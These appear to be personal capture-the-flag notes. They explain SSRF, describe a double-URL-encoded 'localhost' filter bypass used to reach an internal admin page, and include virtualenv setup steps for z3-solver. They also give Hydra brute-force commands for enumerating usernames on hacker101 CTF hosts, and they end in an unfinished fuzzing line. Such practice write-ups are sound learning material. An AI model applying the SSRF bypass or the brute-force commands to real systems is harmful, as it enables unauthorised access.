### What is SSRF?

**SSRF** stands for **Server-Side Request Forgery**.  
It’s a type of web security vulnerability that **tricks the server** into making a request to an unintended location — **internal or external** — on behalf of the attacker.

For an example , there is an CTF challenge , they ask us to access the admin page through port 5000 , in that website there is a url box to type the URL , I typed http://localhost:5000 and interrupt via burpsuite and manually changed the url to http://l%25%36%66calhost:5000 here the o is one time encoded with %6f and two time encoded with %->%25,6->%36,,f->%66 so 0 ->%25%36%66 and finally http://l%25%36%66calhost:5000/admin the flag found 

Which **you cannot directly access from outside**

## Use a Python virtual environment (RECOMMENDED)

Step 1: Install venv if not already available
sudo apt install python3-venv

step 2: Create a virtual environment
python3 -m venv z3env

Step 3: Activate the environment
source z3env/bin/activate

 Step 4: Now install z3-solver inside it
pip install z3-solver

 **USING HYDRA :**
 
 hydra -L rockyou.txt -p aaa 8a72168489f6b7dbbb836097ef336c83.ctf.hacker101.com https-post-form "/login:username=^USER^&password=^PASS^:Invalid username" (or)

 hydra -L rockyou.txt \
      -p test123 \
      -t 4 -f \
      0515bdbbdab9668b20628da9764cc146.ctf.hacker101.com https-post-form \
      "/login:username=^USER^&password=^PASS^:Invalid username"
      
THIS IF FOR THE USERNAME OT BRUTE-FORCE:

**FUZZ:**

FUZZ -w ~/Downloads/